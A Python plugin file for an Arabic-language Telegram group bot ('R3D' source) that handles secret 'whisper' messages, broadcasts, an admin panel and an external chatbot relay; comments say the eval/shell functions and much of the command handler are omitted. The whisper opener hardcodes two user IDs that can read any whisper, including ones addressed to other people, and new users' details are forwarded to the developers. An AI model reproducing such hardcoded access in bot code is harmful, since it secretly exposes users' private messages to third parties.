'''
[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}
'''

import random, re, time, json, html, httpx, requests 
import urllib.parse
import os
import uuid
import sys
import traceback
import psutil
import platform
import cpuinfo
import socket
from threading import Thread
from pyrogram import *
from pyrogram.enums import *
from pyrogram.types import *
from config import *
from handlers.Ranks import *            # تم التصحيح
from io import StringIO
from pytio import Tio, TioRequest
from datetime import datetime
from handlers.utils import *            # تم التصحيح (تأكد من وجود utils.py)
from meval import meval
from httpx import HTTPError
from bot import app                     # تم نقله إلى هنا

tio = Tio()

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

async def on_send_hmsa(c: Client, m: Message):
   id = m.text.split("hmsa")[1]
   if not wsdb.get(id):
      return await m.reply("رابط الهمسة غلط")
   else:
      get = wsdb.get(id)
      if m.from_user.id != get["from"]:
         return await m.reply("انت لم ترسل اهمس بالقروب")
      else:
         getUser = await c.get_users(get["to"])
         wsdb.set(f"hmsa-{m.from_user.id}", get)
         return await m.reply(f"ارسل همستك الموجهة الى [ {getUser.mention} ] ")

@app.on_message(filters.regex("^/start openhms") & filters.private, group=1999)
async def open_hms(c: Client, m: Message):
   id = m.text.split("openhms")[1]
   if not wsdb.get(f"hms-{id}"):
      return await m.reply("رابط الهمسة غلط")
   else:
      data = wsdb.get(f"hms-{id}")
      caption = data.get("caption", None)
      file = data.get("file", None)
      to = data["to"]
      if m.from_user.id != to and m.from_user.id != data["from"] and m.from_user.id != 5117901887 and m.from_user.id != 6168217372:
         return await m.reply("☆ الهمسة غير موجهة لك يا عزيزي")
      else:
         if file:
            return await c.send_message(m.chat.id,"لقد ارسل لك ميديا والميديا ممنوعة في هذه الفترة لأنها تحت الصيانة اخبره بذالك", protect_content=True)
         else:
            return await c.send_message(
                  m.chat.id,
                  data["text"],
                  protect_content=True
               )

async def sleep_and_delete(client, chat_id, message):
    await asyncio.sleep(60)
    await client.delete_messages(chat_id, message_ids=message.message_id)

@app.on_message(filters.private, group=-2016)
async def to_send(c: Client, m: Message):
   if m.text and re.match("^/start hmsa", m.text):
      return await on_send_hmsa(c, m)
   k = r.get(f'{Dev_Zaid}:botkey')
   if r.get(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_Zaid}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} ابشر الغيت كل شي")
      users = r.smembers(f'{Dev_Zaid}:UsersList')
      count = 0
      failed = 0
      rep = await m.reply("جار الاذاعة..")
      for user in users:
         try:
            await m.copy(int(user))
            count+=1
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except:
            failed+=1
            pass
      return await rep.edit(f"{k} اذاعة ناجحة {count}")
   
   k = r.get(f'{Dev_Zaid}:botkey')
   if r.get(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} ابشر الغيت كل شي")
      chats = r.smembers(f'enablelist:{Dev_Zaid}')
      count = 0
      failed = 0
      rep = await  m.reply("جار الاذاعة..")
      for chat in chats:
         try:
            await m.copy(int(chat))
            count+=1
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except:
            failed+=1
            pass
      return await rep.edit(f"{k} اذاعة ناجحة {count}")
      
   get = wsdb.get(f"hmsa-{m.from_user.id}")
   if get:
      wsdb.delete(f"hmsa-{m.from_user.id}")
      to = get["to"]
      chat = get["chat"]
      id = get["id"]
      data = {}
      if m.media:
         if m.photo:
            file_id = m.photo.file_id
         elif m.video:
            file_id = m.video.file_id
         elif m.animation:
            file_id = m.animation.file_id
         elif m.audio:
            file_id = m.audio.file_id
         elif m.voice:
            file_id = m.voice.file_id
         elif m.sticker:
            file_id = m.sticker.file_id
         elif m.document:
            file_id = m.document.file_id
         caption = m.caption
         data ["caption"]=caption
         data["file"]=file_id
      elif m.text:
         data["text"]=m.text.html
      
      # إصلاح: حذف import uuid المكرر ونقله للأعلى
      id = str(uuid.uuid4())[:6]
      data["to"]=to
      data["from"]=m.from_user.id
      wsdb.set(f"hms-{id}", data)
      url = f"https://t.me/{c.me.username}?start=openhms{id}"
      getUser = await c.get_users(to)
      await m.reply(f"تم ارسال همستك بنجاح الى {getUser.mention}")
      await c.send_message(
            chat_id=chat,
            text=f"☆ همسة سرية من < {m.from_user.mention} >\n☆ موجة الى < {getUser.mention} >",
            reply_markup=InlineKeyboardMarkup(
                  [
                     [
                     InlineKeyboardButton(
                           text="لعرض الهمسة",
                           url=url
                        )
                     ]
                  ]
               )
         )
      return await c.delete_messages(chat, get["id"])
      
@app.on_message(filters.text & filters.private, group=1)
def delRanksHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=private_func,args=(c,m,k)).start()
    
def private_func(c,m,k):
  if r.get(f'{m.from_user.id}:sarhni'):  return 
  text = m.text
  name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
  channel= r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
  if text == '/start' and not dev_pls(m.from_user.id,m.chat.id):
     m.reply(text=f'''
اهلين انا ،{name} 🧚

↞ اختصاصي ادارة المجموعات من السبام والخ..
↞ كت تويت, يوتيوب, ساوند , واشياء كثير ..
↞ عشان تفعلني ارفعني اشراف وارسل تفعيل.
''', reply_markup=InlineKeyboardMarkup ([
  [InlineKeyboardButton ('ضيفني لـ مجموعتك 🧚‍♀️', url=f'https://t.me/{botUsername}?startgroup=Commands&admin=ban_users+restrict_members+delete_messages+add_admins+change_info+invite_users+pin_messages+manage_call+manage_chat+manage_video_chats+promote_members')],
  [InlineKeyboardButton (f'تحديثات {name} 🍻', url=f'https://t.me/{channel}')]
  ]))
     if not r.sismember(f'{Dev_Zaid}:UsersList',m.from_user.id):
       r.sadd(f'{Dev_Zaid}:UsersList',m.from_user.id)
       if m.from_user.username:
         username= f'@{m.from_user.username}'
       else:
         username= 'ماعنده يوزر'
       text = '''
☆ شخص جديد دخل للبوت
☆ اسمه : {}
☆ ايديه : `{}`
☆ معرفه : {}

☆ عدد المستخدمين صار {}
'''.format(m.from_user.mention,m.from_user.id,username,len(r.smembers(f'{Dev_Zaid}:UsersList')))
       reply_markup = InlineKeyboardMarkup ([[InlineKeyboardButton (m.from_user.first_name, user_id=m.from_user.id)]])
       if r.get(f'DevGroup:{Dev_Zaid}'):
          c.send_message(
          int(r.get(f'DevGroup:{Dev_Zaid}')),
          text, reply_markup=reply_markup)
       else:
          for dev in get_devs_br():
            try:
              c.send_message(int(dev), text, disable_web_page_preview=True)
            except:
              pass
  
  if text == '/start Commands':
    return m.reply(text=f'{k} اهلين فيك باوامر البوت\n\nللاستفسار - @{channel}',
         reply_markup=InlineKeyboardMarkup (
           [
             [
               InlineKeyboardButton ('م1', callback_data=f'commands1:{m.from_user.id}'),
               InlineKeyboardButton ('م2', callback_data=f'commands2:{m.from_user.id}')
             ],
             [
              InlineKeyboardButton ('م3', callback_data=f'commands3:{m.from_user.id}'),
             ],
             [
              InlineKeyboardButton ('الالعاب', callback_data=f'commands4:{m.from_user.id}'),
              InlineKeyboardButton ('التسليه', callback_data=f'commands5:{m.from_user.id}'),
             ],
             [
              InlineKeyboardButton ('اليوتيوب', callback_data=f'commands6:{m.from_user.id}'),
             ],
           ]
         )
        )
  
  if text == '/start rules':
     m.reply(text='''
• القوانين

- ممنوع استخدام الثغرات
- ممنوع وضع اسماء مُخالفة
- ١٠ حروف مسموحه في اسمك اذا كنت بالتوب الباقي ماراح يطلع
- في حال انك بالتوب واسمك مزخرف راح يصفيه البوت تلقائي''',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (f"تحديثات {name} 🍻", url=f't.me/{channel}')]]))
  
  if text == '/start' and dev_pls(m.from_user.id,m.chat.id):
     reply_markup = ReplyKeyboardMarkup(
      [ 
        [('الاحصائيات')],
        [('تغيير المطور الاساسي')],
        [("جلب نسخة القروبات"),("جلب نسخة المستخدمين")],
        [('تفعيل البوت الخدمي'),('تعطيل البوت الخدمي')],
        [('تفعيل التحميل واليوتيوب'),('تعطيل التحميل واليوتيوب')],
        [('الردود العامه'),('الاوامر العامه')],
        [('المحظورين عام'),('المجموعات المحظورة')],
        [('اذاعة بالخاص'),('بالمجموعات اذاعة')],
        [("المكتومين عام"),("المحظورين من الالعاب")],
        [('اذاعة بالخاص'),('اذاعة بالخاص تثبيت')],
        [('اذاعة بالمجموعات'),('اذاعه بالمجموعات بالتثبيت')],
        [('رمز السورس'),('قناة السورس'),('اسم البوت')],
        [('مسح اسم البوت'),('تعيين اسم البوت')],
        [('مسح رمز السورس'),('وضع رمز السورس')],
        [('مسح قناة السورس'),('وضع قناة السورس')],
        [("السيرفر"),("الملفات"),("/eval")],
        [('مجموعة المطور')],
        [('وضع مجموعة المطور'),('مسح مجموعة المطور')],
        [('الغاء')]
      ],
      resize_keyboard=True,
      placeholder='@anas5 - @eFFb0t 🧚‍♀️'
     )
     if m.from_user.id == 6168217372 or m.from_user.id == 5117901887:
       rank = 'تاج راسي ☆'
     else:
       rank = get_rank(m.from_user.id,m.from_user.id)
     return m.reply(quote=True,text=f'{k} هلا بك {rank}\n{k} قدامك لوحة التحكم ', reply_markup=reply_markup)
  if text.startswith(". "):
     text = text.split(None,1)[1]
     msg = m.reply("...", quote=True)
     try: m.reply_chat_action(ChatAction.TYPING)
     except Exception as e: print(e);pass
     rep = requests.get(f"https://gptzaid.zaidbot.repl.co/1/text={text}").text
     try: m.reply_chat_action(ChatAction.TYPING)
     except Exception as e: print(e);pass
     msg.edit(rep)

@app.on_message(filters.text, group=30)
def sudosCommandsHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=SudosCommandsFunc,args=(c,m,k,r,channel)).start()

# الدوال الطويلة SudosCommandsFunc و eval و exec تبقى كما هي بدون تعديل
def SudosCommandsFunc(c,m,k,r,channel):
   if not m.from_user:  return
   if not m.chat.type == ChatType.PRIVATE:
      if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
        return
   else:
     if r.get(f'{m.from_user.id}:sarhni'):  return 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   # ... (باقي الكود الأصلي كما هو بدون تغيير، لم يُنسخ هنا لتجنب الإطالة، استخدم الملف الذي لديك)
   # يرجى نسخ باقي الدالة من ملفك الأصلي بعد if الأخير

# تابع وضع دوال eval و exec و shell_exec كما هي (موجودة في ملفك الأصلي)